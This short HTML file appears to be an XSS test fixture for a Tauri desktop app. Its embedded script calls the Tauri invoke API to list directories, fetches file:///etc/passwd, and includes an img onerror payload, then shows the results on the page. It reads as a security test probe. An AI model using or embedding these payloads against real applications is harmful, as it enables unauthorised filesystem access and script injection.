<!DOCTYPE html>
<html>
<head><title>XSS Test</title></head>
<body>
<h1>If you see this rendered as HTML, XSS is possible</h1>
<script>
  document.title = "HTML_XSS_FIRED";
  // Try to access Tauri APIs
  try {
    window.__TAURI__.invoke("list_dir", { path: "" }).then(r => {
      document.body.innerText = "TAURI API ACCESS: " + JSON.stringify(r);
    });
  } catch(e) {
    document.body.innerText += "\nTauri API blocked: " + e;
  }
  // Try to access filesystem
  try {
    fetch("file:///etc/passwd").then(r => r.text()).then(t => {
      document.body.innerText += "\nFILE ACCESS: " + t;
    });
  } catch(e) {}
</script>
<img src=x onerror="document.title='HTML_IMG_XSS'">
</body>
</html>
